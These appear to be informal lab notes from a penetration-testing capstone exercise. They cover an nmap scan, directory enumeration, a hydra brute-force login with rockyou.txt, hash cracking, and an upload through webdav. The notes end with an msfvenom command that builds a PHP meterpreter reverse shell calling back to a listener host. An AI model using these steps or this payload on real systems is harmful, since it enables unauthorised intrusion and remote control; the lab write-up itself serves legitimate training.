service scan:

	`nmap -sV -sC -A -p- $(cat capstone_ipu)`
	
80 is ope apache httpd 2.4.29 and the script scan, since this version is pretty old, allows a directory scan of folders that exist. 

MAC Address: Microsoft 

It also runs a tracceroute where the address 1 hop away on the virtual network. 

Basicially, you go through all the directories until you are able to find a note reading ERROR: FILE MISSING please refer to company_folders/secret_folder/

This folder utilized hydra's http-get capabilities.
After digging around in the filesystem you find a username: and with rockyou.txt. http-get is without an option so simplified: 
`hydra argument http-get </path/secret_folder>`

Now we get another hash to reaveal another password. John the ripper or even the Crack Station site was able to crack this hash instantly. 


webdav 

webdav can be accessed dav://192.168.1.105/webdav/ since the kali machine is in the virtaul network. You can go then upload a msfvenom payload. I tried a few of them as it would be a good opportunity to see in the Blue Team segment. 

the final payload payload3>  msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php
